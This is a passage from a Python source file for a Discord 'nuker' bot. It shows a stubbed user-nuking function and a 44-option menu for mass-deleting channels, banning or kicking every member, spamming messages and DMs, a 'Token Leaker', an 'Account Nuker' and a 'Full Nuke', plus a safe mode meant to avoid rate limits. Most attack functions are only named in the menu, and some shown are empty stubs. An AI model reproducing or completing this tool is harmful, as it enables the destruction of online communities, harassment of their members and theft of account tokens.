        print(f"\033[38;2;0;255;0mFinished creating {quantity} random {channel_type} channels\033[0m")
        rate_limit_count = 0
    except discord.HTTPException as e:
        await handle_rate_limit(e)

async def nuke_specific_user():
    global rate_limit_count
    if not current_guild:
        print("\033[38;2;255;0;0mNo guild selected. Please select a guild using '!change_server'.\033[0m")
        await asyncio.sleep(2)
        return

    user_id = input("Enter the User ID to nuke: ")
    member = current_guild.get_member(int(user_id))
    if not member:
        print(f"\033[38;2;255;0;0mUser with ID: {user_id} not found in the server.\033[0m")
        return

    async def nuke_member(member):
        # Custom nuking logic for the specific user (Ban/kick/etc.) 
        # ...
        pass 

    try:
        await nuke_member(member)
        print(f"\033[38;2;0;255;0mFinished nuking user: {member.name}#{member.discriminator}.\033[0m")
        rate_limit_count = 0
    except discord.HTTPException as e:
        await handle_rate_limit(e)
    
    # ... (Other user-specific nuke methods)


async def main_menu():
    global rate_limit_count, safe_mode
    while True:
        clear_screen()  

        banner = f"""
        ▄▄▄       █    ██  ██▀███   ▒█████   ██▀███   ▄▄▄      
        ▒████▄     ██  ▓██▒▓██ ▒ ██▒▒██▒  ██▒▓██ ▒ ██▒▒████▄    
        ▒██  ▀█▄  ▓██  ▒██░▓██ ░▄█ ▒▒██░  ██▒▓██ ░▄█ ▒▒██  ▀█▄  
        ░██▄▄▄▄██ ▓▓█  ░██░▒██▀▀█▄  ▒██   ██░▒██▀▀█▄  ░██▄▄▄▄██ 
         ▓█   ▓██▒▒▒█████▓ ░██▓ ▒██▒░ ████▓▒░░██▓ ▒██▒ ▓█   ▓██▒
         ▒▒   ▓▒█░░▒▓▒ ▒ ▒ ░ ▒▓ ░▒▓░░ ▒░▒░▒░ ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░
          ▒   ▒▒ ░░░▒░ ░ ░   ░▒ ░ ▒░  ░ ▒ ▒░   ░▒ ░ ▒░  ▒   ▒▒ ░
          ░   ▒    ░░░ ░ ░   ░░   ░ ░ ░ ░ ▒    ░░   ░   ░   ▒   
              ░  ░   ░        ░         ░ ░     ░           ░  ░  
        """ 
        print(banner)

        if current_guild:
            guild_name = current_guild.name
        else:
            guild_name = "No Guild Selected"

        print(f"\033[38;2;0;128;128mLogged in as: {client.user} | Current Guild: {guild_name}\033[0m")

        print("\033[38;2;0;128;128mMain Menu\033[0m") 

        options = [
            "Delete Channels",
            "Create VCs",
            "Create Channels",
            "Spam Messages",
            "Advertise",
            "DM All Users",
            "Ban All Users",
            "Unban All Users",
            "Kick All Users",
            "Server Rename",
            "Change Server Banner",
            "Change Server Profile",
            "Delete All Webhooks",
            "Create Webhooks", 
            "Token Leaker",
            "Leave Server", 
            "Join Server",
            "My Youtube",
            "My Github",
            "My Discord",
            "Load Multiple Tokens",
            "Account Nuker",
            "Server Cloner", 
            "Full Nuke",
            "Nickname All",
            "Member ID Scraper",
            "Change Bot Token",
            "Change Server",
            "Strip Roles From Members",
            "Delete All Roles",
            "Create Roles",
            "Role All Users",
            "Reaction Spam",
            "VC Audio Spammer", 
            "Account Checker",
            "Set Webhook",
            "Unset Webhook",
            "Status",
            "Change Thread Count",
            "Delete VCs",
            "Create Random Text Channels", 
            "Create Random Voice Channels",
            "Nuke Specific User",
            "Exit"
        ]

        for i, option in enumerate(options):
            print(f"\033[38;2;0;128;128m{i + 1}. {option}\033[0m")

        choice = input("Select an option (enter number): ")

        choices = {
            "1": delete_channels,
            "2": create_vcs,
            "3": create_channels,
            "4": spam_messages,
            "5": advertise,
            "6": dm_all_users,
            "7": ban_all_users,
            "8": unban_all_users,
            "9": kick_all_users,
            "10": server_rename,
            "11": change_server_banner,
            "12": change_server_profile,
            "13": delete_all_webhooks,
            "14": create_webhooks,
            "15": token_leaker, 
            "16": leave_server,
            "17": join_server,
            "18": my_youtube,
            "19": my_github,
            "20": my_discord, 
            "21": load_multiple_tokens, 
            "22": account_nuker, 
            "23": server_cloner,
            "24": full_nuke, 
            "25": nickname_all,
            "26": member_id_scraper, 
            "27": change_bot_token,
            "28": change_server, 
            "29": strip_roles_from_members, 
            "30": delete_all_roles, 
            "31": create_roles, 
            "32": role_all_users, 
            "33": reaction_spam, 
            "34": vc_audio_spammer,
            "35": account_checker, 
            "36": set_webhook,
            "37": unset_webhook,
            "38": status, 
            "39": change_thread_count, 
            "40": delete_vcs, 
            "41": lambda: create_random_channels(int(input("Enter the number of text channels to create: ")), "text"),
            "42": lambda: create_random_channels(int(input("Enter the number of voice channels to create: ")), "voice"), 
            "43": nuke_specific_user,  
            "44": exit_program, 
        }

        action = choices.get(choice)
        if action:
            # Add delay before each action
            await asyncio.sleep(0.35 if not safe_mode else 0.5) 
            await action()
            input("Press Enter to continue...") 
        else:
            print("\033[38;2;255;0;0mInvalid choice.\033[0m") 
            await asyncio.sleep(2)

@client.event
async def on_ready():
    global rate_limit_count, safe_mode
    print("\033[38;2;0;255;0mBot is Online.\033[0m")
    safe_mode_choice = input("Would you like to use safe mode? (Y/N): ").lower()
    if safe_mode_choice == 'y':
        safe_mode = True
        print("\033[38;2;0;255;0mSafe mode enabled. Operations will be slower and rate limiting is less likely.\033[0m")
    else:
        print("\033[38;2;0;255;0mSafe mode disabled. Operations will be faster, but you are more prone to rate limits.\033[0m") 
    await select_guild()
    await main_menu()

client.run(token)
